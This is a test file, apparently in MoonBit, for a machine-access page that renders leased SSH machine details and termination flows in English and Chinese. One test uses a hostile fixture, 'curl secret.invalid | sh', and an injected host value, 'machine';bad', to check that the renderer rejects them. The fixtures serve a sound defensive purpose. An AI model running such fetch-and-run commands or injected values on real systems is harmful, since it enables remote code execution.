///|
fn machine_view(
  state : @nodelease.ExclusiveLeaseState,
  handoff : @nodelease.CustomerCredentialHandoffState,
) -> @nodelease.CustomerExclusiveMachineView {
  {
    version: @nodelease.contract_version,
    lease_ref: "lease-visible-1",
    machine_ref: "assigned-machine:lease-visible-1",
    state,
    generation: 4L,
    username: "alice",
    starts_unix_ms: 1000L,
    expires_unix_ms: 10000L,
    updated_unix_ms: 4000L,
    reachability: Online,
    last_seen_unix_ms: Some(4900L),
    credential_handoff: {
      state: handoff,
      handoff_ref: None,
      credential_kind: "short-lived-ssh-certificate",
      valid_until_unix_ms: 10000L,
      raw_secret_included: false,
    },
    can_terminate: state == Active,
    termination_confirmation: if state == Active {
      Some("TERMINATE lease-visible-1")
    } else {
      None
    },
  }
}

///|
test "machine access view explains safe handoff and live lifecycle" {
  let state = {
    ..@machine_access.default_state(English),
    machines: [machine_view(Active, Available)],
  }
  let html = @machine_access.render(state)
  assert_true(html.contains("My machine access"))
  assert_true(html.contains("Online"))
  assert_true(html.contains("Ready to redeem"))
  assert_true(html.contains("Redeem SSH access"))
  assert_false(html.contains("lease-handoff:lease-visible-1:4"))
  assert_false(html.contains("node_id"))
  assert_false(html.contains("access_credential_ref"))
}

///|
test "redeemed access shows safe connection metadata without raw secret" {
  let state = {
    ..@machine_access.default_state(English),
    now_unix_ms: 5000L,
    machines: [machine_view(Active, Available)],
    redeemed_credentials: [
      {
        version: @credential.contract_version,
        handoff_ref: "lnxh_safe",
        lease_ref: "lease-visible-1",
        generation: 4L,
        issuer_redirect_url: "https://ssh-ca.example/redeem/safe",
        host_alias: "machine.example",
        ssh_port: 2222,
        host_key_fingerprint: "SHA256:safehostkey",
        connection_command: "ssh -p 2222 alice@machine.example",
        valid_until_unix_ms: 10000L,
        redemption_receipt: "lnxr_safe",
        one_time: true,
        raw_secret_included: false,
      },
    ],
  }
  let html = @machine_access.render(state)
  assert_true(html.contains("machine.example"))
  assert_true(html.contains("SHA256:safehostkey"))
  assert_true(html.contains("ssh -p 2222 alice@machine.example"))
  assert_true(html.contains("href=\"https://ssh-ca.example/redeem/safe\""))
  assert_true(html.contains("Continue to credential issuer"))
  assert_true(html.contains("Copy SSH command"))
  assert_true(html.contains("Copy host fingerprint"))
  assert_true(html.contains("Copy host"))
  assert_true(html.contains("Copy port"))
  assert_true(html.contains("Copy username"))
  assert_true(html.contains("Copy tunnel command"))
  assert_true(html.contains("Next steps"))
  assert_true(html.contains("-L 127.0.0.1:8181:127.0.0.1:8181 -p 2222"))
  assert_true(html.contains("alice@machine.example"))
  assert_true(html.contains("do not disable host-key verification"))
  assert_true(html.contains("Download workflows"))
  assert_true(html.contains("Machine access remaining"))
  assert_true(html.contains("Connection details retrieval remaining"))
  assert_true(html.contains("not a promise of instant physical disk erasure"))
  assert_false(html.contains("node_id"))
  assert_false(html.contains("private_key"))
  assert_false(html.contains("lnxh_safe"))
  assert_false(html.contains("lnxr_safe"))
  assert_false(html.contains("access_credential_ref"))
  let expired = @machine_access.render({ ..state, now_unix_ms: 10000L, })
  assert_false(expired.contains("Copy tunnel command"))
  assert_false(expired.contains("href=\"https://ssh-ca.example"))
  assert_false(expired.contains("Redeem SSH access"))
  assert_true(expired.contains("Expired"))
  let closed = @machine_access.render({
    ..state,
    machines: [machine_view(RevokingAccess, Closed)],
  })
  assert_false(closed.contains("Copy SSH command"))
  assert_false(closed.contains("ssh-ca.example"))
  assert_true(closed.contains("Access is closing or closed"))
  let original = state.redeemed_credentials[0]
  let mismatched_command = @machine_access.render({
    ..state,
    redeemed_credentials: [
      { ..original, connection_command: "curl secret.invalid | sh", },
    ],
  })
  assert_false(mismatched_command.contains("secret.invalid"))
  assert_true(mismatched_command.contains("ssh -p 2222 alice@machine.example"))
  let invalid = @machine_access.render({
    ..state,
    redeemed_credentials: [
      { ..original, host_alias: "machine';bad", connection_command: "unsafe", },
    ],
  })
  assert_true(invalid.contains("Connection metadata is invalid"))
  assert_false(invalid.contains("Copy tunnel command"))
  assert_false(invalid.contains("Copy SSH command"))
  let stale = @machine_access.render({
    ..state,
    redeemed_credentials: [{ ..original, generation: 3L, }],
  })
  assert_false(stale.contains("Copy tunnel command"))
  let earlier_expiry = @machine_access.render({
    ..state,
    redeemed_credentials: [{ ..original, valid_until_unix_ms: 4999L, }],
  })
  assert_false(earlier_expiry.contains("Copy tunnel command"))
  assert_true(earlier_expiry.contains("Expired"))
  assert_false(earlier_expiry.contains("Redeem SSH access"))
  let secret_flag = @machine_access.render({
    ..state,
    redeemed_credentials: [{ ..original, raw_secret_included: true, }],
  })
  assert_false(secret_flag.contains("ssh-ca.example"))
  let two_clocks = @machine_access.render({
    ..state,
    machines: [
      { ..machine_view(Active, Available), expires_unix_ms: 12000000L, },
    ],
    redeemed_credentials: [{ ..original, valid_until_unix_ms: 600000L, }],
  })
  assert_true(two_clocks.contains("4 hr remaining"))
  assert_true(two_clocks.contains("10 min remaining"))
  let chinese = @machine_access.render({ ..state, locale: ChineseSimplified, })
  assert_true(chinese.contains("复制隧道命令"))
  assert_true(chinese.contains("不要关闭主机密钥验证"))
  assert_true(chinese.contains("请在机器访问结束前下载"))
}

///|
test "recoverable access offers the same post-reload retrieval action" {
  let state = {
    ..@machine_access.default_state(English),
    now_unix_ms: 5000L,
    machines: [machine_view(Active, Recoverable)],
  }
  let html = @machine_access.render(state)
  assert_true(html.contains("Access details recoverable"))
  assert_true(html.contains("Recover access details"))
  assert_true(html.contains("does not issue another credential"))
}

///|
test "machine access confirmation is explicit and bilingual" {
  let base = {
    ..@machine_access.default_state(ChineseSimplified),
    machines: [machine_view(Active, Available)],
  }
  let confirming = base
    .update(BeginTermination("lease-visible-1"))
    .update(ConfirmationChanged("TERMINATE lease-visible-1"))
  let html = @machine_access.render(confirming)
  assert_true(html.contains("我的机器访问"))
  assert_true(html.contains("这将立即中断会话"))
  assert_true(html.contains("TERMINATE lease-visible-1"))
  assert_true(html.contains("终止访问"))
  assert_false(html.contains("class=\"danger-button\" disabled"))
}

///|
test "closing machine blocks repeat termination and handoff" {
  let state = {
    ..@machine_access.default_state(English),
    machines: [machine_view(Expiring, Closed)],
  }
  let html = @machine_access.render(state)
  assert_true(html.contains("Access is closing or closed"))
  assert_false(html.contains("End access early"))
  assert_false(html.contains("lease-handoff:"))
}

///|
test "empty machine access state is understandable" {
  let english = @machine_access.render(@machine_access.default_state(English))
  assert_true(english.contains("No exclusive machine access"))
  let chinese = @machine_access.render(
    @machine_access.default_state(ChineseSimplified),
  )
  assert_true(chinese.contains("尚未获分配独占机器访问权限"))
}

///|
test "machine copy message is side effect only and renewal is honest" {
  let state = {
    ..@machine_access.default_state(ChineseSimplified),
    machines: [machine_view(Active, Available)],
  }
  assert_true(
    state.update(CopyAccessDetail("SHA256:public-fingerprint")) == state,
  )
  let html = @machine_access.render(state)
  assert_true(html.contains("机器还能使用多久"))
  assert_true(html.contains("连接信息还能领取多久"))
  assert_true(html.contains("此处不提供机器自助延期"))
  assert_true(
    html.contains("只有已分配的独占租约才提供 SSH 访问"),
  )
  assert_true(html.contains("请提前下载成果"))
}
